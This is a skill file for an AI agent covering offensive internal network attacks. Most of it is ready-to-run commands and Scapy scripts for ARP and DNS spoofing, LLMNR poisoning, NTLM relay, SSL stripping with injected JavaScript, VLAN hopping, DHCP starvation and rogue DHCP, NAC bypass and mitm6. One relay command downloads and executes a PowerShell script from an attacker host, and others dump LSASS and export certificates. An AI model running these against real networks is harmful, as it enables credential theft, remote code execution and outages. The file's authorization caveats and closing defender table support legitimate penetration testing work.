---
name: offensive-network-attacks
description: "Network-level attack techniques targeting Layer 2 and Layer 3 protocols for internal penetration testing and red team engagements. Covers ARP spoofing and cache poisoning (arpspoof, Bettercap, Ettercap), LLMNR/NBT-NS/mDNS poisoning for credential interception (Responder, Inveigh), DNS poisoning and spoofing, man-in-the-middle attack execution (Bettercap, SSL stripping, HSTS bypass via sslstrip+ and dns2proxy), VLAN hopping (switch spoofing, double tagging/Q-in-Q), DHCP attacks (rogue DHCP server, DHCP starvation), 802.1X and NAC bypass techniques (MAC spoofing, hub-based bypass, certificate extraction), IPv6 attacks (SLAAC abuse, mitm6 DNS takeover, IPv6 router advertisement flooding), and network traffic sniffing and analysis with Wireshark and tcpdump. Integrates with Bettercap for MITM framework operations, Responder for multicast name resolution poisoning, mitm6 for IPv6-based attacks, Ettercap for legacy MITM scenarios, and Wireshark for packet analysis. Maps to MITRE ATT&CK T1557 (Adversary-in-the-Middle) and T1040 (Network Sniffing). All techniques assume you are operating on an authorized internal network assessment with explicit written scope."
---

# Offensive Network Attacks

Internal network assessments begin the moment you have a foothold on the wire or WLAN. Layer 2 and Layer 3 protocols were designed for functionality and interoperability, not security -- most broadcast, resolve, and route without authentication. You exploit that trust to intercept credentials, redirect traffic, and pivot across network segments.

These techniques assume you have authorized access to an internal network segment. Executing ARP spoofing, DHCP attacks, or VLAN hopping on a production network can cause outages. Coordinate with the client's network operations team, define a maintenance window for disruptive tests, and have rollback procedures ready.

## Quick Workflow

1. Perform passive reconnaissance: identify the subnet, gateway, VLAN assignments, active hosts, and naming conventions.
2. Run Responder in analyze mode to observe LLMNR/NBT-NS/mDNS traffic without poisoning.
3. Enable Responder poisoning to capture NTLMv2 hashes from broadcast name resolution.
4. If credential interception is insufficient, escalate to ARP spoofing for targeted MITM against high-value hosts.
5. Attempt VLAN hopping or IPv6 attacks if segmentation limits your reach.
6. Crack captured hashes offline; relay credentials where cracking is impractical.
7. Document all intercepted traffic, credentials, and network misconfigurations for the final report.

---

## ARP Spoofing and Cache Poisoning

ARP has no authentication mechanism. You send gratuitous ARP replies to associate your MAC address with the gateway's IP on victim hosts, routing their traffic through your machine.

### ARP Spoofing with Bettercap

Bettercap is the modern replacement for arpspoof and Ettercap. It provides a unified MITM framework with modules for ARP spoofing, DNS spoofing, packet proxying, and credential sniffing.

```bash
# Start Bettercap on the target interface
sudo bettercap -iface eth0

# Inside the Bettercap interactive console:

# Discover live hosts on the subnet
net.probe on

# List discovered targets
net.show

# Enable ARP spoofing -- full-duplex (both target and gateway)
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.50
arp.spoof on

# Enable packet forwarding to maintain connectivity
set net.sniff.local true
net.sniff on

# Capture HTTP credentials
set http.proxy.sslstrip true
http.proxy on

# Capture HTTPS credentials (with SSL stripping)
set https.proxy.sslstrip true
https.proxy on
```

### ARP Spoofing with arpspoof (Legacy)

```bash
# Enable IP forwarding to prevent DoS
echo 1 > /proc/sys/net/ipv4/ip_forward

# Poison the victim's ARP cache (tell victim you are the gateway)
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

# In a second terminal, poison the gateway (tell gateway you are the victim)
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50

# Now all traffic between victim and gateway flows through your machine
# Capture with tcpdump:
tcpdump -i eth0 -w capture.pcap host 192.168.1.50
```

### ARP Spoofing with Ettercap

```bash
# Text mode -- ARP poisoning between target and gateway
sudo ettercap -T -q -M arp:remote /192.168.1.50// /192.168.1.1//

# With a compiled Ettercap filter to inject content in transit:
etterfilter inject_html.ef -o inject_html.eco
sudo ettercap -T -q -M arp:remote -F inject_html.eco /192.168.1.50// /192.168.1.1//
```

---

## LLMNR/NBT-NS/mDNS Poisoning

When DNS resolution fails, Windows falls back to Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS). These broadcast protocols ask the entire subnet "who is X?" -- and you answer first with your IP address, redirecting authentication attempts to your machine.

### Responder

Responder is the standard tool for poisoning multicast name resolution and capturing NTLMv2 hashes. It runs rogue SMB, HTTP, LDAP, FTP, and SQL servers to provoke authentication.

```bash
# Run Responder in analyze mode first (passive -- no poisoning)
sudo responder -I eth0 -A

# Review the output to understand what protocols are in use
# and which hosts are broadcasting name resolution queries

# Enable poisoning with all rogue servers
sudo responder -I eth0 -wrfb

# Flags breakdown:
#   -w   Start the WPAD rogue proxy server
#   -r   Enable NetBIOS wrapping answers
#   -f   Fingerprint hosts that connect
#   -b   Enable HTTP basic auth (for non-NTLM clients)

# Captured hashes are stored in:
# /opt/Responder/logs/

# Hash format (NTLMv2):
# user::DOMAIN:challenge:response:blob
# Crack with hashcat:
hashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule
```

### NTLM Relay with ntlmrelayx (Instead of Cracking)

When hashes resist cracking, relay them to another service that accepts NTLM authentication.

```bash
# Identify hosts with SMB signing disabled (relay targets)
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Start ntlmrelayx targeting those hosts
# Disable SMB and HTTP in Responder first (ntlmrelayx will handle them)
sudo python3 ntlmrelayx.py -tf relay_targets.txt -smb2support

# Responder forces authentication; ntlmrelayx relays the hash
# to execute commands on the relay target:
sudo python3 ntlmrelayx.py -tf relay_targets.txt -smb2support \
    -c "powershell -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1'))"

# Or dump SAM hashes from the relay target:
sudo python3 ntlmrelayx.py -tf relay_targets.txt -smb2support --dump-lsass
```

### Inveigh (Windows-Native Poisoning)

When you are operating from a compromised Windows host, Inveigh is the PowerShell-based equivalent of Responder.

```powershell
# Import and run Inveigh
Import-Module .\Inveigh.ps1

# Start poisoning from a Windows host
Invoke-Inveigh -LLMNR Y -NBNS Y -mDNS Y -ConsoleOutput Y -FileOutput Y

# Or use InveighZero (the C# version) for better performance
.\InveighZero.exe -LLMNR Y -NBNS Y -mDNS Y -FileOutput Y

# Captured hashes are written to the current directory
# Format is identical to Responder output -- compatible with hashcat
```

---

## DNS Poisoning and Spoofing

DNS spoofing redirects domain lookups to your controlled IP address. Combined with ARP spoofing, you can hijack authentication flows, redirect updates, or serve malicious content.

### DNS Spoofing with Bettercap

```bash
# Bettercap DNS spoofing -- redirect specific domains
sudo bettercap -iface eth0

# Create a DNS spoofing hosts file
# File: /tmp/dns_spoof_hosts
# Format: IP  domain
# 192.168.1.100  intranet.targetcorp.com
# 192.168.1.100  vpn.targetcorp.com
# 192.168.1.100  *.targetcorp.com

set dns.spoof.domains intranet.targetcorp.com, vpn.targetcorp.com
set dns.spoof.address 192.168.1.100
dns.spoof on

# Combine with ARP spoofing for full interception
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
```

### DNS Spoofing with dnschef

```bash
# Standalone DNS proxy for targeted spoofing
sudo dnschef --fakeip 192.168.1.100 --fakedomains targetcorp.com -i 192.168.1.100

# Configuration file for complex mappings (/tmp/dnschef.ini):
# [A]
# *.targetcorp.com=192.168.1.100
# [AAAA]
# *.targetcorp.com=::1
sudo dnschef --file /tmp/dnschef.ini -i 192.168.1.100
```

---

## Man-in-the-Middle Attacks

Once you are positioned between a victim and their gateway (via ARP spoofing, DNS poisoning, or rogue network services), you can inspect, modify, and inject traffic.

### SSL Stripping

SSL stripping downgrades HTTPS connections to HTTP by intercepting the initial redirect and rewriting links. This fails against HSTS-preloaded domains but works against sites relying solely on server-side redirects.

```bash
# Bettercap SSL stripping with hstshijack caplet
sudo bettercap -iface eth0

# Load the hstshijack caplet for HSTS bypass
set hstshijack.log /tmp/hsts.log
set hstshijack.payloads *:/tmp/inject.js
set hstshijack.targets mail.targetcorp.com,intranet.targetcorp.com
set hstshijack.replacements mail.targetcorp.corn,intranet.targetcorp.corn
set hstshijack.obfuscate true
set hstshijack.encode true

hstshijack on
arp.spoof on
```

### HSTS Bypass with sslstrip+

sslstrip+ combined with dns2proxy replaces domain names themselves so the browser never applies its HSTS policy. Set up IP forwarding, iptables redirect to port 10000, run sslstrip+ and dns2proxy, then ARP spoof the target.

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 10000
python3 sslstrip.py -l 10000 -a -w /tmp/sslstrip.log &
python3 dns2proxy.py &
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
```

### Credential Interception from MITM Position

```bash
# Bettercap built-in credential sniffing
set net.sniff.verbose true
set net.sniff.regexp .*password.*
net.sniff on

# Extract credentials from pcap files offline
pcredz -f capture.pcap
# Or real-time extraction across protocols (HTTP, FTP, SMTP, NTLM)
sudo python3 net-creds.py -i eth0
```

---

## VLAN Hopping

VLAN segmentation isolates broadcast domains, but misconfigurations in switch port settings allow you to send traffic into VLANs you should not reach.

### Switch Spoofing

If a switch port is configured in dynamic trunking mode (the default on many Cisco switches), you can negotiate a trunk link and access all VLANs.

```bash
# Use Yersinia to negotiate a DTP trunk
sudo yersinia dtp -attack 1 -interface eth0

# Or manually craft DTP frames with scapy
python3 <<'PYEOF'
from scapy.all import *
from scapy.contrib.dtp import *

# Send DTP desirable frames to negotiate trunking
dtp_frame = (
    Dot3(src=get_if_hwaddr("eth0"), dst="01:00:0c:cc:cc:cc") /
    LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
    SNAP(OUI=0x00000c, code=0x2004) /
    DTP(tlvlist=[
        DTPDomain(type=0x0001, length=5, domain=b""),
        DTPStatus(type=0x0002, length=5, status=b"\x03"),  # Desirable
        DTPType(type=0x0003, length=5, dtptype=b"\xa5"),    # 802.1Q
        DTPNeighbor(type=0x0004, length=10, neighbor=get_if_hwaddr("eth0"))
    ])
)

sendp(dtp_frame, iface="eth0", loop=1, inter=30)
PYEOF

# Once trunking is established, create VLAN sub-interfaces
sudo modprobe 8021q
sudo vconfig add eth0 100    # Target VLAN 100
sudo ifconfig eth0.100 192.168.100.5 netmask 255.255.255.0 up
```

### Double Tagging (Q-in-Q)

When switch spoofing fails (DTP is disabled), double tagging exploits the way switches process nested 802.1Q headers. The outer tag is stripped by the first switch, and the inner tag routes the frame into the target VLAN. This is a one-way attack -- you can send but not receive replies directly.

```python
# Double tagging with Scapy
from scapy.all import *

# Craft a double-tagged frame
# Outer VLAN: your native VLAN (e.g., 1)
# Inner VLAN: target VLAN (e.g., 100)
frame = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    Dot1Q(vlan=1) /       # Outer tag (native VLAN -- stripped by first switch)
    Dot1Q(vlan=100) /     # Inner tag (routes to target VLAN)
    IP(dst="192.168.100.1") /
    ICMP()
)

sendp(frame, iface="eth0")

# For practical exploitation, combine with ARP poisoning:
# Send double-tagged ARP replies to poison caches in the target VLAN
arp_poison = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    Dot1Q(vlan=1) /
    Dot1Q(vlan=100) /
    ARP(op=2, psrc="192.168.100.1", hwsrc="aa:bb:cc:dd:ee:ff",
        pdst="192.168.100.50", hwdst="ff:ff:ff:ff:ff:ff")
)

sendp(arp_poison, iface="eth0", count=10, inter=2)
```

---

## DHCP Attacks

DHCP has no authentication. You can starve the legitimate DHCP server of its address pool and then step in as a rogue server, pushing your IP as the default gateway and DNS server.

### DHCP Starvation

Exhaust the DHCP server's address pool by requesting every available lease with spoofed MAC addresses.

```bash
# DHCPig -- purpose-built DHCP starvation tool
sudo pig.py eth0

# Or with Yersinia
sudo yersinia dhcp -attack 1 -interface eth0
```

```python
# Scapy-based starvation -- fine-grained control
from scapy.all import *
import random

for i in range(500):
    mac = ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])
    raw_mac = bytes.fromhex(mac.replace(":", ""))
    pkt = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
           IP(src="0.0.0.0", dst="255.255.255.255") /
           UDP(sport=68, dport=67) /
           BOOTP(chaddr=raw_mac, xid=random.randint(1, 0xFFFFFFFF)) /
           DHCP(options=[("message-type", "discover"), "end"]))
    sendp(pkt, iface="eth0", verbose=False)
```

### Rogue DHCP Server

After starvation (or on a subnet without DHCP snooping), deploy a rogue DHCP server that assigns your machine as the gateway and DNS server.

```bash
# Bettercap rogue DHCP
sudo bettercap -iface eth0

set dhcp6.spoof.domains targetcorp.com
set dhcp6.spoof.address 192.168.1.100  # Your IP

# For DHCPv4 rogue server, use Metasploit:
msfconsole -q -x "
use auxiliary/server/dhcp;
set SRVHOST 192.168.1.100;
set NETMASK 255.255.255.0;
set ROUTER 192.168.1.100;
set DNSSERVER 192.168.1.100;
set DHCPIPSTART 192.168.1.200;
set DHCPIPEND 192.168.1.250;
run
"

# All clients receiving leases from your rogue server now
# route through you (gateway) and resolve DNS through you
```

---

## 802.1X and NAC Bypass

Network Access Control uses 802.1X authentication to restrict network access to authorized devices. Several bypass techniques exist depending on the implementation.

### MAC Address Spoofing

If NAC relies on MAC-based authentication (MAB) rather than certificate-based 802.1X, spoof an authorized MAC address.

```bash
# Find authorized MAC addresses on the network
# Sniff traffic on an unauthenticated port or from ARP broadcasts
sudo tcpdump -i eth0 -e -c 100 | awk '{print $2}' | sort -u

# Or read the MAC from an authorized device's network configuration
# (if you have physical access to a printer, IP phone, etc.)

# Spoof the MAC address
sudo ifconfig eth0 down
sudo macchanger -m AA:BB:CC:DD:EE:FF eth0
sudo ifconfig eth0 up
sudo dhclient eth0
```

### Hub-Based 802.1X Bypass

Insert a passive hub between an authenticated device (printer, IP phone) and the switch port. The switch sees the port as authenticated; your device shares that state. Spoof the authenticated device's MAC. This works because 802.1X authenticates the port, not individual MACs (unless per-MAC dynamic ACLs are configured).

### Certificate Extraction for EAP-TLS

```bash
# On a compromised domain-joined Windows machine (local admin):
certutil -store My
# Export with private key via mimikatz:
# mimikatz # crypto::certificates /systemstore:local_machine /export

# Configure your attack machine for EAP-TLS with the extracted cert:
cat <<'EOF' > /etc/wpa_supplicant/wpa_supplicant.conf
network={
    ssid="CorpWiFi"
    key_mgmt=WPA-EAP
    eap=TLS
    identity="TARGETCORP\WORKSTATION01$"
    ca_cert="/etc/certs/ca.pem"
    client_cert="/etc/certs/client.pem"
    private_key="/etc/certs/client.key"
    private_key_passwd="exported_password"
}
EOF
wpa_supplicant -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf
```

---

## IPv6 Attacks

Most internal networks have IPv6 enabled by default but lack IPv6 security controls. Windows prefers IPv6 over IPv4 -- if you advertise an IPv6 router, Windows clients will route through you.

### SLAAC Abuse and mitm6

mitm6 exploits the default IPv6 configuration on Windows to become the primary DNS server via DHCPv6, then relays authentication to ntlmrelayx.

```bash
# mitm6 -- IPv6 DNS takeover
# Responds to DHCPv6 requests and sets your machine as DNS server
# Victims resolve internal names through you -> authentication -> relay

# Terminal 1: Start mitm6
sudo mitm6 -d targetcorp.com -i eth0

# Terminal 2: Start ntlmrelayx to relay captured auth
sudo python3 ntlmrelayx.py -6 -t ldaps://dc01.targetcorp.com \
    -wh fakewpad.targetcorp.com -l /tmp/loot/

# What happens:
# 1. mitm6 sends DHCPv6 replies assigning your IP as DNS server
# 2. Windows clients start sending DNS queries to you
# 3. mitm6 responds to DNS queries with your IP address
# 4. Clients attempt authentication (WPAD, SMB, HTTP)
# 5. ntlmrelayx relays the auth to the domain controller via LDAP
# 6. On success: creates a new machine account, dumps AD info, etc.
```

### IPv6 Router Advertisement Injection

```python
# Scapy -- inject a rogue Router Advertisement to become default router
from scapy.all import *

ra = (
    Ether(dst="33:33:00:00:00:01") /
    IPv6(src="fe80::1", dst="ff02::1") /
    ICMPv6ND_RA(routerlifetime=1800) /
    ICMPv6NDOptSrcLLAddr(lladdr=get_if_hwaddr("eth0")) /
    ICMPv6NDOptMTU(mtu=1500) /
    ICMPv6NDOptPrefixInfo(prefix="2001:db8::", prefixlen=64,
        validlifetime=0xFFFFFFFF, preferredlifetime=0xFFFFFFFF)
)
sendp(ra, iface="eth0", loop=1, inter=5)

# For bulk flooding (DoS): sudo flood_router6 eth0  (THC-IPv6 toolkit)
# Combine with rogue DNS (dnschef on IPv6) for full traffic interception
# Detection note: RA Guard blocks this but most orgs have not deployed it
```

---

## Network Sniffing

Passive traffic analysis reveals credentials, internal services, network architecture, and communication patterns without generating any attack traffic.

### Targeted Capture and Credential Extraction

```bash
# Capture authentication traffic by protocol
sudo tcpdump -i eth0 -w /tmp/smb.pcap 'port 445 or port 139'
sudo tcpdump -i eth0 -w /tmp/cleartext.pcap 'port 21 or port 23 or port 389'
sudo tcpdump -i eth0 -w /tmp/full_capture.pcap

# Automatic credential extraction from pcap (NTLM, HTTP, FTP, SMTP, SNMP)
sudo python3 Pcredz -f /tmp/full_capture.pcap

# Real-time credential sniffing
sudo python3 net-creds.py -i eth0

# Key Wireshark display filters:
#   ntlmssp.messagetype == 0x00000003         (NTLM auth)
#   kerberos.msg.type == 10                    (Kerberos AS-REQ)
#   http.request.method == "POST"              (HTTP credentials)
#   ftp.request.command == "USER" || ftp.request.command == "PASS"
#   snmp.community                             (SNMP community strings)
```

---

## Detection / Defender View

| Attack | Detection Method | Defensive Control |
|---|---|---|
| ARP spoofing | Duplicate IP-MAC mappings, ARP storm alerts, IDS signatures | Dynamic ARP Inspection (DAI), static ARP entries for critical hosts |
| LLMNR/NBT-NS poisoning | Multicast traffic spikes, unexpected SMB auth to unknown hosts | Disable LLMNR and NBT-NS via GPO, use DNS suffixes |
| DNS poisoning | Mismatched DNS responses, TTL anomalies, multiple answers for one query | DNSSEC, DNS monitoring, outbound DNS restricted to authorized resolvers |
| SSL stripping | HTTP connections to known HTTPS-only services, certificate warnings | HSTS preloading, certificate pinning, TLS inspection on egress proxy |
| VLAN hopping | DTP negotiation from access ports, frames with unexpected VLAN tags | Disable DTP on all access ports, set native VLAN to unused VLAN |
| DHCP attacks | Multiple DHCP requests from different MACs on one port, rogue DHCP offers | DHCP snooping, port security with MAC limits |
| 802.1X bypass | Multiple MACs on an authenticated port, MAC address changes | 802.1X with per-MAC authentication, MACSec encryption |
| IPv6 attacks | Unexpected Router Advertisements, DHCPv6 from unknown sources | RA Guard, DHCPv6 Guard, disable IPv6 if not used |
| Network sniffing | Promiscuous mode detection, unusual traffic volume on monitoring ports | Network encryption (IPsec, MACSec), switch port monitoring |

Network defenders should prioritize: enabling DAI and DHCP snooping on all switches, disabling LLMNR/NBT-NS enterprise-wide, enforcing SMB signing, deploying RA Guard on IPv6-capable switches, and setting all access ports to nonegotiate mode with a dedicated unused native VLAN.

---

## Engagement Cheatsheet

```text
PRE-ENGAGEMENT
  [ ] Written authorization specifying which network segments are in scope
  [ ] Coordination with network operations (maintenance window for disruptive tests)
  [ ] Rollback procedures documented for ARP, DHCP, and VLAN attacks
  [ ] Attack machine configured: IP forwarding, tool dependencies, capture storage
  [ ] Baseline network scan completed (know what is normal before you disrupt it)

PASSIVE RECONNAISSANCE
  [ ] Network sniffing: identify subnets, VLANs, gateways, DNS servers
  [ ] Responder in analyze mode: observe broadcast name resolution traffic
  [ ] Identify high-value targets: domain controllers, file servers, admin workstations
  [ ] Map VLAN assignments and inter-VLAN routing

ACTIVE EXPLOITATION
  [ ] Responder poisoning: capture NTLMv2 hashes from LLMNR/NBT-NS
  [ ] ARP spoofing: targeted MITM against specific hosts (not broadcast)
  [ ] VLAN hopping: attempt DTP negotiation, double tagging
  [ ] IPv6 attacks: mitm6 for DNS takeover and credential relay
  [ ] DHCP attacks: rogue server deployment (coordinate with blue team)
  [ ] Crack captured hashes; relay where cracking is impractical

POST-ENGAGEMENT
  [ ] Stop all poisoning and spoofing; verify network has recovered
  [ ] Confirm no residual ARP cache corruption on critical hosts
  [ ] Remove rogue DHCP leases and IPv6 router advertisements
  [ ] Compile intercepted credentials, captured traffic, and network gaps
  [ ] Recommendations: DAI, DHCP snooping, LLMNR disable, SMB signing,
      RA Guard, switch port hardening, network segmentation review
```

---

## Key References

- MITRE ATT&CK T1557 -- Adversary-in-the-Middle (T1557.001 LLMNR/NBT-NS, T1557.002 ARP Cache Poisoning, T1557.003 DHCP Spoofing)
- MITRE ATT&CK T1040 -- Network Sniffing
- Bettercap -- https://www.bettercap.org
- Responder -- https://github.com/lgandx/Responder
- mitm6 -- https://github.com/dirkjanm/mitm6
- Ettercap -- https://www.ettercap-project.org
- Inveigh -- https://github.com/Kevin-Robertson/Inveigh
- impacket (ntlmrelayx) -- https://github.com/fortra/impacket
- THC-IPv6 -- https://github.com/vanhauser-thc/thc-ipv6
- Yersinia -- https://github.com/tomac/yersinia
- Wireshark -- https://www.wireshark.org
- PCredz -- https://github.com/lgandx/PCredz
